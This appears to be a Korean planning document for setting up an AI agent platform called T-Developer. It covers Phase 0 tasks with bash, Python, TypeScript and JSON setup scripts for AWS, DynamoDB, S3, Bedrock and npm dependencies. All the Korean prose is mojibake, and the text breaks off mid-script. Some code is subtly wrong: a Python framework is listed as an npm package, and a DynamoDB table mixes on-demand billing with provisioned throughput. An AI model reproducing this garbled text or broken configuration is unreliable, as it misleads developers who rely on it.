# T-Developer ì™„ì „ êµ¬í˜„ì„ ìœ„í•œ 3ë‹¨ê³„ ì„¸ë¶„í™” ì‘ì—… ë¬¸ì„œ

## ğŸ“Œ ì „ì²´ êµ¬ì¡° ê°œìš”

```
ì´ 10ê°œ Phase
â”œâ”€â”€ Phase 0: ì‚¬ì „ ì¤€ë¹„ ë° í™˜ê²½ ì„¤ì • (15 Tasks)
â”œâ”€â”€ Phase 1: ì½”ì–´ ì¸í”„ë¼ êµ¬ì¶• (20 Tasks)
â”œâ”€â”€ Phase 2: ë°ì´í„° ë ˆì´ì–´ êµ¬í˜„ (15 Tasks)
â”œâ”€â”€ Phase 3: ì—ì´ì „íŠ¸ í”„ë ˆì„ì›Œí¬ êµ¬ì¶• (20 Tasks)
â”œâ”€â”€ Phase 4: 9ê°œ í•µì‹¬ ì—ì´ì „íŠ¸ êµ¬í˜„ (90 Tasks)
â”œâ”€â”€ Phase 5: ì˜¤ì¼€ìŠ¤íŠ¸ë ˆì´ì…˜ ì‹œìŠ¤í…œ (15 Tasks)
â”œâ”€â”€ Phase 6: API ë ˆì´ì–´ êµ¬í˜„ (25 Tasks)
â”œâ”€â”€ Phase 7: í”„ë¡ íŠ¸ì—”ë“œ êµ¬í˜„ (30 Tasks)
â”œâ”€â”€ Phase 8: í†µí•© ë° í…ŒìŠ¤íŠ¸ (20 Tasks)
â””â”€â”€ Phase 9: ë°°í¬ ë° ìš´ì˜ (15 Tasks)

ì´ ì˜ˆìƒ ì‘ì—…: 265 Tasks Ã— í‰ê·  4 SubTasks = ì•½ 1,060ê°œ ì‘ì—… ë‹¨ìœ„
```

---

# ğŸ“‹ Phase 0: ì‚¬ì „ ì¤€ë¹„ ë° í™˜ê²½ ì„¤ì •

## Task 0.1: ê°œë°œ í™˜ê²½ ì´ˆê¸° ì„¤ì •

### SubTask 0.1.1: í•„ìˆ˜ ë„êµ¬ ì„¤ì¹˜ í™•ì¸
**ëª©í‘œ**: ê°œë°œì— í•„ìš”í•œ ëª¨ë“  ë„êµ¬ê°€ ì„¤ì¹˜ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸

**êµ¬í˜„ ë‚´ìš©**:
```bash
#!/bin/bash
# check-requirements.sh

echo "ğŸ” ê°œë°œ í™˜ê²½ ì²´í¬ ì‹œì‘..."

# Node.js ë²„ì „ í™•ì¸
NODE_VERSION=$(node -v)
if [[ ! "$NODE_VERSION" =~ ^v18\.|^v20\. ]]; then
    echo "âŒ Node.js 18+ í•„ìš” (í˜„ì¬: $NODE_VERSION)"
    exit 1
fi

# Python ë²„ì „ í™•ì¸
PYTHON_VERSION=$(python3 --version)
if [[ ! "$PYTHON_VERSION" =~ 3\.(9|10|11) ]]; then
    echo "âŒ Python 3.9+ í•„ìš” (í˜„ì¬: $PYTHON_VERSION)"
    exit 1
fi

# AWS CLI í™•ì¸
if ! command -v aws &> /dev/null; then
    echo "âŒ AWS CLIê°€ ì„¤ì¹˜ë˜ì§€ ì•ŠìŒ"
    exit 1
fi

# Docker í™•ì¸
if ! command -v docker &> /dev/null; then
    echo "âŒ Dockerê°€ ì„¤ì¹˜ë˜ì§€ ì•ŠìŒ"
    exit 1
fi

echo "âœ… ëª¨ë“  í•„ìˆ˜ ë„êµ¬ê°€ ì„¤ì¹˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤!"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- Node.js 18+ ì„¤ì¹˜
- Python 3.9+ ì„¤ì¹˜
- AWS CLI v2 ì„¤ì¹˜
- Docker Desktop ì„¤ì¹˜
- Git ì„¤ì¹˜

### SubTask 0.1.2: AWS ê³„ì • ë° ê¶Œí•œ ì„¤ì •
**ëª©í‘œ**: AWS ì„œë¹„ìŠ¤ ì‚¬ìš©ì„ ìœ„í•œ ê³„ì • ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```python
# scripts/setup-aws-profile.py
import boto3
import json
import os

def create_iam_policy():
    """T-Developerì— í•„ìš”í•œ IAM ì •ì±… ìƒì„±"""
    policy_document = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "bedrock:*",
                    "lambda:*",
                    "dynamodb:*",
                    "s3:*",
                    "cloudwatch:*",
                    "logs:*",
                    "iam:PassRole"
                ],
                "Resource": "*"
            }
        ]
    }
    
    return json.dumps(policy_document)

def setup_aws_profile():
    """AWS í”„ë¡œí•„ ì„¤ì • í™•ì¸"""
    try:
        sts = boto3.client('sts')
        identity = sts.get_caller_identity()
        print(f"âœ… AWS ê³„ì • í™•ì¸: {identity['Account']}")
        print(f"âœ… ì‚¬ìš©ì ARN: {identity['Arn']}")
    except Exception as e:
        print(f"âŒ AWS ìê²© ì¦ëª… ì˜¤ë¥˜: {e}")
        return False
    
    return True

if __name__ == "__main__":
    if setup_aws_profile():
        print("\nğŸ“‹ í•„ìš”í•œ IAM ì •ì±…:")
        print(create_iam_policy())
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:


### SubTask 0.1.3: í”„ë¡œì íŠ¸ ì €ì¥ì†Œ ì´ˆê¸°í™”
**ëª©í‘œ**: Git ì €ì¥ì†Œ ë° ê¸°ë³¸ êµ¬ì¡° ìƒì„±

**êµ¬í˜„ ë‚´ìš©**:
```bash
#!/bin/bash
# init-repository.sh

# í”„ë¡œì íŠ¸ ë£¨íŠ¸ ìƒì„±
mkdir -p T-DeveloperMVP
cd T-DeveloperMVP

# Git ì´ˆê¸°í™”
git init

# ê¸°ë³¸ .gitignore ìƒì„±
cat > .gitignore << EOF
# Dependencies
node_modules/
.pnp
.pnp.js

# Testing
coverage/
*.lcov
.nyc_output

# Production
build/
dist/
*.log

# Environment
.env
.env.local
.env.*.local

# AWS
.aws/
*.pem

# IDE
.vscode/
.idea/
*.swp
*.swo
*~

# OS
.DS_Store
Thumbs.db

# Python
__pycache__/
*.py[cod]
*$py.class
.Python
venv/
ENV/

# Terraform
*.tfstate
*.tfstate.*
.terraform/
EOF

# ê¸°ë³¸ README ìƒì„±
cat > README.md << EOF
# T-Developer

AI-powered multi-agent development platform.

## ğŸš€ Getting Started

### Prerequisites
- Node.js 18+
- Python 3.9+
- AWS Account
- Docker

### Installation
\`\`\`bash
# Clone repository
git clone https://github.com/your-org/t-developer.git

# Install dependencies
npm install
\`\`\`

## ğŸ“š Documentation
- [Architecture](./docs/architecture.md)
- [API Reference](./docs/api.md)
- [Agent Guide](./docs/agents.md)
EOF

git add .
git commit -m "Initial commit: Project setup"

echo "âœ… ì €ì¥ì†Œ ì´ˆê¸°í™” ì™„ë£Œ!"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- GitHub/GitLab ì €ì¥ì†Œ ìƒì„±
- ì›ê²© ì €ì¥ì†Œ ì—°ê²°
- ì´ˆê¸° ì»¤ë°‹ í‘¸ì‹œ

### SubTask 0.1.4: í™˜ê²½ ë³€ìˆ˜ í…œí”Œë¦¿ ìƒì„±
**ëª©í‘œ**: í•„ìš”í•œ ëª¨ë“  í™˜ê²½ ë³€ìˆ˜ í…œí”Œë¦¿ íŒŒì¼ ìƒì„±

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// scripts/create-env-template.ts
import fs from 'fs';
import path from 'path';

const envTemplate = `# T-Developer Environment Configuration

# Node Environment
NODE_ENV=development
PORT=3000
LOG_LEVEL=debug

# AWS Configuration
AWS_ACCESS_KEY_ID=your-access-key-here
AWS_SECRET_ACCESS_KEY=your-secret-key-here
AWS_REGION=us-east-1
AWS_BEDROCK_REGION=us-east-1

# AI Model API Keys
OPENAI_API_KEY=sk-proj-xxxxxxxxxxxxx
ANTHROPIC_API_KEY=sk-ant-xxxxxxxxxxxxx

# Bedrock AgentCore Configuration
BEDROCK_AGENTCORE_RUNTIME_ID=runtime-xxx
BEDROCK_AGENTCORE_GATEWAY_URL=https://xxx.agentcore.amazonaws.com

# Agent Squad Configuration
AGENT_SQUAD_STORAGE=dynamodb
AGENT_SQUAD_TIMEOUT=300

# Database Configuration
DYNAMODB_ENDPOINT=http://localhost:8000
DYNAMODB_REGION=us-east-1

# S3 Configuration
S3_ARTIFACTS_BUCKET=t-developer-artifacts
S3_REGION=us-east-1

# Redis Configuration (for caching)
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=

# GitHub Integration
GITHUB_TOKEN=ghp_xxxxxxxxxxxxx
GITHUB_OWNER=your-org
GITHUB_REPO=t-developer

# Monitoring
AGNO_MONITORING_URL=https://agno.com
ENABLE_MONITORING=true

# Security
JWT_SECRET=your-super-secret-jwt-key
ENCRYPTION_KEY=your-32-character-encryption-key

# External Services
NPM_REGISTRY_URL=https://registry.npmjs.org
PYPI_INDEX_URL=https://pypi.org/simple
MAVEN_CENTRAL_URL=https://repo.maven.apache.org/maven2

# Feature Flags
ENABLE_CACHE=true
ENABLE_TELEMETRY=true
MAX_CONCURRENT_AGENTS=50
`;

const envExamplePath = path.join(process.cwd(), '.env.example');
fs.writeFileSync(envExamplePath, envTemplate);

console.log('âœ… .env.example íŒŒì¼ ìƒì„± ì™„ë£Œ!');
console.log('ğŸ“‹ ë‹¤ìŒ ë‹¨ê³„:');
console.log('1. .env.exampleì„ .envë¡œ ë³µì‚¬');
console.log('2. ì‹¤ì œ ê°’ìœ¼ë¡œ í™˜ê²½ ë³€ìˆ˜ ì—…ë°ì´íŠ¸');
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- `.env.example`ì„ `.env`ë¡œ ë³µì‚¬
- ëª¨ë“  í™˜ê²½ ë³€ìˆ˜ ê°’ ì…ë ¥
- AWS ìê²© ì¦ëª… ì„¤ì •
- API í‚¤ íšë“ ë° ì„¤ì •

### SubTask 0.1.5: ê°œë°œ ë„êµ¬ ì„¤ì • íŒŒì¼ ìƒì„±
**ëª©í‘œ**: VS Code, ESLint, Prettier ë“± ê°œë°œ ë„êµ¬ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```json
// .vscode/settings.json
{
  "editor.formatOnSave": true,
  "editor.codeActionsOnSave": {
    "source.fixAll.eslint": true
  },
  "typescript.tsdk": "node_modules/typescript/lib",
  "files.exclude": {
    "**/.git": true,
    "**/.DS_Store": true,
    "**/node_modules": true,
    "**/dist": true,
    "**/build": true
  },
  "search.exclude": {
    "**/node_modules": true,
    "**/dist": true,
    "**/coverage": true
  }
}
```

```javascript
// .eslintrc.js
module.exports = {
  parser: '@typescript-eslint/parser',
  parserOptions: {
    project: 'tsconfig.json',
    sourceType: 'module',
  },
  plugins: ['@typescript-eslint', 'import'],
  extends: [
    'eslint:recommended',
    'plugin:@typescript-eslint/recommended',
    'plugin:prettier/recommended',
  ],
  root: true,
  env: {
    node: true,
    jest: true,
  },
  rules: {
    '@typescript-eslint/interface-name-prefix': 'off',
    '@typescript-eslint/explicit-function-return-type': 'off',
    '@typescript-eslint/explicit-module-boundary-types': 'off',
    '@typescript-eslint/no-explicit-any': 'warn',
    'import/order': ['error', {
      'groups': ['builtin', 'external', 'internal', 'parent', 'sibling', 'index'],
      'newlines-between': 'always'
    }]
  },
};
```

```json
// .prettierrc
{
  "singleQuote": true,
  "trailingComma": "all",
  "printWidth": 100,
  "tabWidth": 2,
  "semi": true,
  "bracketSpacing": true,
  "arrowParens": "always",
  "endOfLine": "lf"
}
```

---

## Task 0.2: AWS ë¦¬ì†ŒìŠ¤ ì´ˆê¸° ì„¤ì •

### SubTask 0.2.1: DynamoDB ë¡œì»¬ ì„¤ì •
**ëª©í‘œ**: ê°œë°œìš© DynamoDB Local ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```yaml
# docker-compose.dev.yml
version: '3.8'

services:
  dynamodb-local:
    image: amazon/dynamodb-local:latest
    container_name: t-developer-dynamodb
    ports:
      - "8000:8000"
    command: "-jar DynamoDBLocal.jar -sharedDb -inMemory"
    volumes:
      - "./docker/dynamodb:/home/dynamodblocal/data"
    working_dir: /home/dynamodblocal

  dynamodb-admin:
    image: aaronshaf/dynamodb-admin
    container_name: t-developer-dynamodb-admin
    ports:
      - "8001:8001"
    environment:
      DYNAMO_ENDPOINT: "http://dynamodb-local:8000"
      AWS_REGION: "us-east-1"
      AWS_ACCESS_KEY_ID: "local"
      AWS_SECRET_ACCESS_KEY: "local"
    depends_on:
      - dynamodb-local

  redis:
    image: redis:7-alpine
    container_name: t-developer-redis
    ports:
      - "6379:6379"
    command: redis-server --appendonly yes
    volumes:
      - "./docker/redis:/data"
```

```typescript
// scripts/setup-local-db.ts
import { DynamoDBClient, CreateTableCommand } from '@aws-sdk/client-dynamodb';

const client = new DynamoDBClient({
  endpoint: 'http://localhost:8000',
  region: 'us-east-1',
  credentials: {
    accessKeyId: 'local',
    secretAccessKey: 'local'
  }
});

async function createTables() {
  // Projects í…Œì´ë¸”
  const projectsTable = new CreateTableCommand({
    TableName: 'T-Developer-Projects',
    KeySchema: [
      { AttributeName: 'id', KeyType: 'HASH' },
    ],
    AttributeDefinitions: [
      { AttributeName: 'id', AttributeType: 'S' },
      { AttributeName: 'userId', AttributeType: 'S' },
      { AttributeName: 'createdAt', AttributeType: 'S' },
    ],
    GlobalSecondaryIndexes: [
      {
        IndexName: 'UserIdIndex',
        KeySchema: [
          { AttributeName: 'userId', KeyType: 'HASH' },
          { AttributeName: 'createdAt', KeyType: 'RANGE' },
        ],
        Projection: { ProjectionType: 'ALL' },
        ProvisionedThroughput: {
          ReadCapacityUnits: 5,
          WriteCapacityUnits: 5,
        },
      },
    ],
    BillingMode: 'PAY_PER_REQUEST',
  });

  try {
    await client.send(projectsTable);
    console.log('âœ… Projects í…Œì´ë¸” ìƒì„± ì™„ë£Œ');
  } catch (error) {
    console.error('âŒ Projects í…Œì´ë¸” ìƒì„± ì‹¤íŒ¨:', error);
  }
}

createTables();
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- Docker Desktop ì‹¤í–‰
- `docker-compose -f docker-compose.dev.yml up -d` ì‹¤í–‰
- DynamoDB Admin UI ì ‘ì† í™•ì¸ (http://localhost:8001)

### SubTask 0.2.2: S3 ë²„í‚· ìƒì„± ìŠ¤í¬ë¦½íŠ¸
**ëª©í‘œ**: í•„ìš”í•œ S3 ë²„í‚· ìƒì„± ìë™í™”

**êµ¬í˜„ ë‚´ìš©**:
```python
# scripts/create-s3-buckets.py
import boto3
import json
from botocore.exceptions import ClientError

def create_bucket_if_not_exists(s3_client, bucket_name, region):
    """S3 ë²„í‚·ì´ ì—†ìœ¼ë©´ ìƒì„±"""
    try:
        s3_client.head_bucket(Bucket=bucket_name)
        print(f"âœ… ë²„í‚·ì´ ì´ë¯¸ ì¡´ì¬í•¨: {bucket_name}")
    except ClientError as e:
        error_code = e.response['Error']['Code']
        if error_code == '404':
            try:
                if region == 'us-east-1':
                    s3_client.create_bucket(Bucket=bucket_name)
                else:
                    s3_client.create_bucket(
                        Bucket=bucket_name,
                        CreateBucketConfiguration={'LocationConstraint': region}
                    )
                print(f"âœ… ë²„í‚· ìƒì„± ì™„ë£Œ: {bucket_name}")
                
                # ë²„í‚· ì •ì±… ì„¤ì •
                set_bucket_policy(s3_client, bucket_name)
                
            except ClientError as e:
                print(f"âŒ ë²„í‚· ìƒì„± ì‹¤íŒ¨: {e}")
        else:
            print(f"âŒ ë²„í‚· í™•ì¸ ì‹¤íŒ¨: {e}")

def set_bucket_policy(s3_client, bucket_name):
    """ë²„í‚· ì •ì±… ì„¤ì •"""
    bucket_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "AllowCloudFrontAccess",
                "Effect": "Allow",
                "Principal": {
                    "Service": "cloudfront.amazonaws.com"
                },
                "Action": "s3:GetObject",
                "Resource": f"arn:aws:s3:::{bucket_name}/*"
            }
        ]
    }
    
    s3_client.put_bucket_policy(
        Bucket=bucket_name,
        Policy=json.dumps(bucket_policy)
    )

def main():
    region = 'us-east-1'
    s3_client = boto3.client('s3', region_name=region)
    
    buckets = [
        't-developer-artifacts',
        't-developer-components',
        't-developer-templates',
        't-developer-backups'
    ]
    
    for bucket in buckets:
        create_bucket_if_not_exists(s3_client, bucket, region)

if __name__ == "__main__":
    main()
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- AWS ì½˜ì†”ì—ì„œ S3 ì„œë¹„ìŠ¤ ì ‘ê·¼ í™•ì¸
- ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰: `python scripts/create-s3-buckets.py`
- ë²„í‚· ìƒì„± í™•ì¸

### SubTask 0.2.3: Bedrock ëª¨ë¸ ì•¡ì„¸ìŠ¤ ìš”ì²­
**ëª©í‘œ**: AWS Bedrock ëª¨ë¸ ì‚¬ìš© ê¶Œí•œ íšë“

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// scripts/request-bedrock-access.ts
import { BedrockClient, ListFoundationModelsCommand } from '@aws-sdk/client-bedrock';

async function checkBedrockAccess() {
  const client = new BedrockClient({ region: 'us-east-1' });
  
  try {
    const command = new ListFoundationModelsCommand({});
    const response = await client.send(command);
    
    console.log('âœ… Bedrock ì•¡ì„¸ìŠ¤ í™•ì¸ë¨');
    console.log('ì‚¬ìš© ê°€ëŠ¥í•œ ëª¨ë¸:');
    
    response.modelSummaries?.forEach(model => {
      console.log(`- ${model.modelId}: ${model.modelName}`);
    });
    
  } catch (error) {
    console.error('âŒ Bedrock ì•¡ì„¸ìŠ¤ ì˜¤ë¥˜:', error);
    console.log('\nğŸ“‹ Bedrock ëª¨ë¸ ì•¡ì„¸ìŠ¤ ìš”ì²­ ë°©ë²•:');
    console.log('1. AWS Console > Bedrock ì„œë¹„ìŠ¤ë¡œ ì´ë™');
    console.log('2. Model access ë©”ë‰´ í´ë¦­');
    console.log('3. ë‹¤ìŒ ëª¨ë¸ë“¤ì— ëŒ€í•´ ì•¡ì„¸ìŠ¤ ìš”ì²­:');
    console.log('   - Anthropic Claude 3 Sonnet');
    console.log('   - Anthropic Claude 3 Opus');
    console.log('   - Amazon Nova Pro');
    console.log('   - Amazon Nova Lite');
  }
}

checkBedrockAccess();
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- AWS Consoleì—ì„œ Bedrock ì„œë¹„ìŠ¤ ì ‘ì†
- Model access ë©”ë‰´ì—ì„œ í•„ìš”í•œ ëª¨ë¸ ì•¡ì„¸ìŠ¤ ìš”ì²­
- ìŠ¹ì¸ ëŒ€ê¸° (ë³´í†µ ì¦‰ì‹œ ìŠ¹ì¸)
- ìŠ¤í¬ë¦½íŠ¸ë¡œ ì•¡ì„¸ìŠ¤ í™•ì¸

### SubTask 0.2.4: Lambda ë ˆì´ì–´ ì¤€ë¹„
**ëª©í‘œ**: ê³µí†µ ì˜ì¡´ì„±ì„ ìœ„í•œ Lambda ë ˆì´ì–´ ìƒì„±

**êµ¬í˜„ ë‚´ìš©**:
```bash
#!/bin/bash
# scripts/create-lambda-layers.sh

# Node.js ë ˆì´ì–´ ìƒì„±
mkdir -p layers/nodejs-common/nodejs
cd layers/nodejs-common/nodejs

# package.json ìƒì„±
cat > package.json << EOF
{
  "name": "t-developer-common-layer",
  "version": "1.0.0",
  "dependencies": {
    "aws-sdk": "^3.0.0",
    "axios": "^1.6.0",
    "lodash": "^4.17.21",
    "uuid": "^9.0.0",
    "joi": "^17.11.0"
  }
}
EOF

npm install --production

cd ..
zip -r nodejs-common-layer.zip nodejs/

# Python ë ˆì´ì–´ ìƒì„±
mkdir -p ../python-common/python
cd ../python-common

cat > requirements.txt << EOF
boto3>=1.26.0
requests>=2.31.0
pandas>=2.0.0
numpy>=1.24.0
EOF

pip install -r requirements.txt -t python/
zip -r python-common-layer.zip python/

echo "âœ… Lambda ë ˆì´ì–´ ìƒì„± ì™„ë£Œ!"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- ìƒì„±ëœ ZIP íŒŒì¼ì„ AWS Lambda ì½˜ì†”ì—ì„œ ë ˆì´ì–´ë¡œ ì—…ë¡œë“œ
- ë ˆì´ì–´ ARN ê¸°ë¡

### SubTask 0.2.5: CloudWatch ëŒ€ì‹œë³´ë“œ í…œí”Œë¦¿
**ëª©í‘œ**: ëª¨ë‹ˆí„°ë§ì„ ìœ„í•œ CloudWatch ëŒ€ì‹œë³´ë“œ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```json
// cloudwatch/dashboard-template.json
{
  "widgets": [
    {
      "type": "metric",
      "properties": {
        "metrics": [
          ["T-Developer", "AgentExecutionTime", {"stat": "Average"}],
          [".", ".", {"stat": "Maximum"}],
          [".", "AgentSuccessRate", {"stat": "Average"}]
        ],
        "period": 300,
        "stat": "Average",
        "region": "us-east-1",
        "title": "Agent Performance"
      }
    },
    {
      "type": "metric",
      "properties": {
        "metrics": [
          ["AWS/Lambda", "Invocations", {"stat": "Sum"}],
          [".", "Errors", {"stat": "Sum"}],
          [".", "Duration", {"stat": "Average"}]
        ],
        "period": 300,
        "stat": "Average",
        "region": "us-east-1",
        "title": "Lambda Functions"
      }
    },
    {
      "type": "log",
      "properties": {
        "query": "SOURCE '/aws/lambda/t-developer'\n| fields @timestamp, @message\n| filter @message like /ERROR/\n| sort @timestamp desc\n| limit 20",
        "region": "us-east-1",
        "title": "Recent Errors"
      }
    }
  ]
}
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- CloudWatch ì½˜ì†”ì—ì„œ ëŒ€ì‹œë³´ë“œ ìƒì„±
- í…œí”Œë¦¿ JSON ì„í¬íŠ¸
- ì•ŒëŒ ì„¤ì •

---

## Task 0.3: í”„ë¡œì íŠ¸ ì˜ì¡´ì„± ì„¤ì¹˜

### SubTask 0.3.1: ë°±ì—”ë“œ ì˜ì¡´ì„± ì„¤ì¹˜
**ëª©í‘œ**: Node.js ë°±ì—”ë“œ ì˜ì¡´ì„± ì„¤ì¹˜ ë° ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```json
// backend/package.json
{
  "name": "t-developer-backend",
  "version": "1.0.0",
  "description": "T-Developer Backend Services",
  "scripts": {
    "dev": "nodemon",
    "build": "tsc",
    "start": "node dist/main.js",
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "lint": "eslint src/**/*.ts",
    "format": "prettier --write src/**/*.ts"
  },
  "dependencies": {
    "@aws-sdk/client-bedrock": "^3.0.0",
    "@aws-sdk/client-bedrock-runtime": "^3.0.0",
    "@aws-sdk/client-dynamodb": "^3.0.0",
    "@aws-sdk/client-lambda": "^3.0.0",
    "@aws-sdk/client-s3": "^3.0.0",
    "@aws-sdk/lib-dynamodb": "^3.0.0",
    "agno": "latest",
    "agent-squad": "latest",
    "express": "^4.18.0",
    "fastapi": "^0.1.0",
    "joi": "^17.11.0",
    "winston": "^3.11.0",
    "bull": "^4.11.0",
    "ioredis": "^5.3.0",
    "jsonwebtoken": "^9.0.0",
    "bcrypt": "^5.1.0",
    "axios": "^1.6.0",
    "lodash": "^4.17.21",
    "uuid": "^9.0.0"
  },
  "devDependencies": {
    "@types/express": "^4.17.0",
    "@types/jest": "^29.5.0",
    "@types/node": "^20.0.0",
    "@typescript-eslint/eslint-plugin": "^6.0.0",
    "@typescript-eslint/parser": "^6.0.0",
    "eslint": "^8.0.0",
    "eslint-config-prettier": "^9.0.0",
    "eslint-plugin-prettier": "^5.0.0",
    "jest": "^29.7.0",
    "nodemon": "^3.0.0",
    "prettier": "^3.0.0",
    "ts-jest": "^29.1.0",
    "ts-node": "^10.9.0",
    "typescript": "^5.0.0"
  }
}
```

```bash
#!/bin/bash
# scripts/install-backend-deps.sh

cd backend
npm install

# Agno í”„ë ˆì„ì›Œí¬ ì„¤ì¹˜ í™•ì¸
if ! npm list agno > /dev/null 2>&1; then
    echo "âš ï¸  Agno ì„¤ì¹˜ í™•ì¸ í•„ìš”"
    npm install agno@latest
fi

# Agent Squad ì„¤ì¹˜ í™•ì¸
if ! npm list agent-squad > /dev/null 2>&1; then
    echo "âš ï¸  Agent Squad ì„¤ì¹˜ í™•ì¸ í•„ìš”"
    npm install agent-squad@latest
fi

echo "âœ… ë°±ì—”ë“œ ì˜ì¡´ì„± ì„¤ì¹˜ ì™„ë£Œ!"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- `cd backend && npm install` ì‹¤í–‰
- ì„¤ì¹˜ ì˜¤ë¥˜ ë°œìƒ ì‹œ í•´ê²°

### SubTask 0.3.2: Python ì˜ì¡´ì„± ì„¤ì¹˜
**ëª©í‘œ**: Python ìŠ¤í¬ë¦½íŠ¸ ë° ë„êµ¬ë¥¼ ìœ„í•œ ì˜ì¡´ì„± ì„¤ì¹˜

**êµ¬í˜„ ë‚´ìš©**:
```txt
# requirements.txt
boto3>=1.26.0
botocore>=1.29.0
python-dotenv>=1.0.0
requests>=2.31.0
pydantic>=2.0.0
fastapi>=0.100.0
uvicorn>=0.23.0
pytest>=7.4.0
black>=23.0.0
flake8>=6.0.0
mypy>=1.5.0
```

```python
# scripts/setup-python-env.py
import subprocess
import sys
import venv
import os

def create_virtual_env():
    """Python ê°€ìƒ í™˜ê²½ ìƒì„±"""
    venv_path = os.path.join(os.getcwd(), 'venv')
    
    if not os.path.exists(venv_path):
        print("ğŸ”§ Python ê°€ìƒ í™˜ê²½ ìƒì„± ì¤‘...")
        venv.create(venv_path, with_pip=True)
        print("âœ… ê°€ìƒ í™˜ê²½ ìƒì„± ì™„ë£Œ")
    else:
        print("âœ… ê°€ìƒ í™˜ê²½ì´ ì´ë¯¸ ì¡´ì¬í•©ë‹ˆë‹¤")
    
    # í™œì„±í™” ëª…ë ¹ ì¶œë ¥
    if sys.platform == "win32":
        activate_cmd = f"{venv_path}\\Scripts\\activate"
    else:
        activate_cmd = f"source {venv_path}/bin/activate"
    
    print(f"\nğŸ“‹ ê°€ìƒ í™˜ê²½ í™œì„±í™” ëª…ë ¹:")
    print(f"   {activate_cmd}")
    
    return venv_path

def install_dependencies():
    """ì˜ì¡´ì„± ì„¤ì¹˜"""
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
    subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])

if __name__ == "__main__":
    create_virtual_env()
    # ì£¼ì˜: ê°€ìƒ í™˜ê²½ í™œì„±í™” í›„ ìˆ˜ë™ìœ¼ë¡œ ì„¤ì¹˜ í•„ìš”
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- Python ê°€ìƒ í™˜ê²½ ìƒì„±: `python -m venv venv`
- ê°€ìƒ í™˜ê²½ í™œì„±í™”
- `pip install -r requirements.txt` ì‹¤í–‰

### SubTask 0.3.3: í”„ë¡ íŠ¸ì—”ë“œ ì˜ì¡´ì„± ì¤€ë¹„
**ëª©í‘œ**: React ê¸°ë°˜ í”„ë¡ íŠ¸ì—”ë“œ ì´ˆê¸° ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```json
// frontend/package.json
{
  "name": "t-developer-frontend",
  "version": "1.0.0",
  "private": true,
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.20.0",
    "@mui/material": "^5.14.0",
    "@emotion/react": "^11.11.0",
    "@emotion/styled": "^11.11.0",
    "axios": "^1.6.0",
    "socket.io-client": "^4.7.0",
    "@tanstack/react-query": "^5.0.0",
    "zustand": "^4.4.0",
    "react-hook-form": "^7.48.0",
    "recharts": "^2.10.0",
    "monaco-editor": "^0.44.0",
    "@monaco-editor/react": "^4.6.0"
  },
  "devDependencies": {
    "@types/react": "^18.2.0",
    "@types/react-dom": "^18.2.0",
    "@vitejs/plugin-react": "^4.2.0",
    "vite": "^5.0.0",
    "typescript": "^5.0.0",
    "@typescript-eslint/eslint-plugin": "^6.0.0",
    "@typescript-eslint/parser": "^6.0.0",
    "eslint": "^8.0.0",
    "eslint-plugin-react": "^7.33.0",
    "eslint-plugin-react-hooks": "^4.6.0"
  },
  "scripts": {
    "dev": "vite",
    "build": "tsc && vite build",
    "preview": "vite preview",
    "lint": "eslint src --ext ts,tsx",
    "type-check": "tsc --noEmit"
  }
}
```

```typescript
// frontend/vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  plugins: [react()],
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
  server: {
    port: 3000,
    proxy: {
      '/api': {
        target: 'http://localhost:8000',
        changeOrigin: true,
      },
      '/ws': {
        target: 'ws://localhost:8000',
        ws: true,
      },
    },
  },
});
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- í”„ë¡ íŠ¸ì—”ë“œ ë””ë ‰í† ë¦¬ ìƒì„± (ì•„ì§ êµ¬í˜„í•˜ì§€ ì•ŠìŒ)
- ë‚˜ì¤‘ì— Phase 7ì—ì„œ ì‹¤ì œ ì„¤ì¹˜ ì§„í–‰

### SubTask 0.3.4: ê°œë°œ ë„êµ¬ ì „ì—­ ì„¤ì¹˜
**ëª©í‘œ**: í•„ìš”í•œ ì „ì—­ ê°œë°œ ë„êµ¬ ì„¤ì¹˜

**êµ¬í˜„ ë‚´ìš©**:
```bash
#!/bin/bash
# scripts/install-global-tools.sh

echo "ğŸ”§ ì „ì—­ ê°œë°œ ë„êµ¬ ì„¤ì¹˜ ì¤‘..."

# TypeScript
npm install -g typescript

# AWS CDK
npm install -g aws-cdk

# Serverless Framework
npm install -g serverless

# PM2 (í”„ë¡œì„¸ìŠ¤ ê´€ë¦¬)
npm install -g pm2

# Lerna (ëª¨ë…¸ë ˆí¬ ê´€ë¦¬)
npm install -g lerna

echo "âœ… ì „ì—­ ë„êµ¬ ì„¤ì¹˜ ì™„ë£Œ!"

# ì„¤ì¹˜ í™•ì¸
